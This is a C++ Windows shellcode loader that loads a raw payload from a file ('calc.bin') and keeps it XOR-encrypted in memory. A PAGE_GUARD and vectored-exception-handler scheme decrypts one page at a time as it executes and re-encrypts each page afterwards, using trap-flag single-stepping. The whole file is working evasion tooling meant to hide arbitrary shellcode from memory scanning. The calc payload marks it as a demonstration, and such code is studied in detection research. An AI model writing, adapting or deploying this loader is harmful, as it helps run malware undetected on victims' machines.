#include <windows.h>
#include <stdio.h>
#include <vector>
#include <fstream>

using namespace std;

#define XOR_KEY 0xAA
#define PAGE_SIZE 4096

void* exec_mem = nullptr;
SIZE_T shellcode_len = 0;
DWORD old_protect = 0;

int current_page = -1;
SIZE_T current_page_start = 0;
SIZE_T current_page_len = 0;
bool in_shellcode = false;

// XOR encryption method
void xor_transform(unsigned char* data, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) data[i] ^= XOR_KEY;
}

// Calculate page index
int get_page_index(void* addr) {
    SIZE_T offset = (SIZE_T)addr - (SIZE_T)exec_mem;
    if (offset >= shellcode_len) return -1;
    return (int)(offset / PAGE_SIZE);
}

// Calculate page start
void* get_page_start(int idx) { return (BYTE*)exec_mem + (idx * PAGE_SIZE); }

// Calculate page length
SIZE_T get_page_len(int idx) {
    SIZE_T start = idx * PAGE_SIZE;
    if (start + PAGE_SIZE > shellcode_len) return shellcode_len - start;
    return PAGE_SIZE;
}

LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo)
{
    // Get the current instruction pointer (RIP) and the base address of our shellcode
    DWORD64 rip = ExceptionInfo->ContextRecord->Rip;
    DWORD64 start = (DWORD64)exec_mem;   // start of our allocated shellcode memory

    // STAGE 1: GUARD PAGE VIOLATION
    // This exception is triggered when we try to read/execute from a page
    // that has the PAGE_GUARD flag set. We use this as our "lazy decryption trigger".
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION)
    {
        // ExceptionInformation[1] holds the address that was accessed at fault
        void* faultAddr = (void*)ExceptionInfo->ExceptionRecord->ExceptionInformation[1];

        // Convert the fault address to a page index
        int idx = get_page_index(faultAddr);
        if (idx < 0) return EXCEPTION_CONTINUE_SEARCH;   // not in our shellcode – let other handlers deal with it

        // Get the page’s base address and actual length
        void* pageBase = get_page_start(idx);
        SIZE_T pageLen = get_page_len(idx);

        // Make the page writable so we can decrypt it
        VirtualProtect(pageBase, pageLen, PAGE_READWRITE, &old_protect);

        // Decrypt the page using XOR (symmetric, so same function encrypts/decrypts)
        xor_transform((unsigned char*)pageBase, pageLen);

        // Make it executable and remove the PAGE_GUARD flag
        VirtualProtect(pageBase, pageLen, PAGE_EXECUTE_READ, &old_protect);

        printf("[+] Decrypted page %d (offset 0x%04X)\n", idx, idx * PAGE_SIZE);

        // Remember which page we are currently executing in
        current_page = idx;
        current_page_start = idx * PAGE_SIZE;
        current_page_len = pageLen;
        in_shellcode = true;                     // we are now inside the shellcode region

        // Set the Trap Flag (TF) in EFLAGS – this will cause a single?step exception
        // after *every* instruction. This allows us to detect when execution leaves the page.
        ExceptionInfo->ContextRecord->EFlags |= 0x100;   // 0x100 = TF bit

        // Resume execution at the faulting instruction (which is now decrypted and executable)
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // STAGE 2: SINGLE?STEP EXCEPTION
    // This exception fires after *every* instruction when the Trap Flag is set.
    // We use it to detect when execution leaves the current page, so we can re?encrypt it.
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        // Check if we are in shellcode and have a valid current page
        if (in_shellcode && current_page >= 0)
        {
            // Calculate the address range of the current page
            SIZE_T page_start = current_page_start;
            SIZE_T page_end = page_start + current_page_len;

            // Check if RIP is still inside the current page
            if (rip >= start + page_start && rip < start + page_end)
            {
                // Still inside the same page – keep single?stepping by re?setting TF
                ExceptionInfo->ContextRecord->EFlags |= 0x100;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                // RIP has left the page
                // This means the shellcode has jumped to another page or outside.
                // We now re?encrypt the page we just left, so it becomes hidden again.

                int old_idx = current_page;
                void* pageBase = get_page_start(old_idx);
                SIZE_T pageLen = current_page_len;

                // Make the page writable
                VirtualProtect(pageBase, pageLen, PAGE_READWRITE, &old_protect);

                // Re?encrypt the page to restore encrypted state
                xor_transform((unsigned char*)pageBase, pageLen);

                // Re?apply PAGE_GUARD so any future access will trigger decryption again
                VirtualProtect(pageBase, pageLen, PAGE_EXECUTE_READ | PAGE_GUARD, &old_protect);
                printf("[*] Re-encrypted and re-guarded page %d\n", old_idx);

                // Clear the current page state and stop single?stepping
                current_page = -1;
                in_shellcode = false;
                ExceptionInfo->ContextRecord->EFlags &= ~0x100;   // clear TF

                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
        else
        {
            // We are not in shellcode (e.g., execution has jumped into a system DLL)
            // Clear TF to avoid stepping through thousands of system instructions
            ExceptionInfo->ContextRecord->EFlags &= ~0x100;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    // For any other exception, continue searching for a handler
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {

    // Load shellcode
    ifstream infile(R"(../../calc.bin)", ios::in | ios::binary);
    if (!infile.is_open()) { printf("Failed to open file.\n"); return 1; }
    infile.seekg(0, ios::end);
    shellcode_len = infile.tellg();
    vector<char> buf(shellcode_len);
    infile.seekg(0, ios::beg);
    infile.read(buf.data(), shellcode_len);
    infile.close();

    // Allocate executable memory
    exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Copy shellcode into allocated memory
    RtlMoveMemory(exec_mem, buf.data(), shellcode_len);

    // Encrypt
    xor_transform((unsigned char*)exec_mem, shellcode_len);
    printf("[*] Shellcode encrypted.\n");

    // Set PAGE_GUARD on every page
    size_t num_pages = (shellcode_len + PAGE_SIZE - 1) / PAGE_SIZE;
    for (int i = 0; i < num_pages; i++) {
        void* pageBase = get_page_start(i);
        SIZE_T pageLen = get_page_len(i);
        VirtualProtect(pageBase, pageLen, PAGE_EXECUTE_READ | PAGE_GUARD, &old_protect);
    }
    printf("[*] PAGE_GUARD set on all pages.\n");

    // Register Vectored Exception Handler
    AddVectoredExceptionHandler(1, handler);
    printf("[*] VEH installed.\n");

    // Execute shellcode
    printf("[*] Executing shellcode...\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    printf("[*] Shellcode returned.\n");
    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}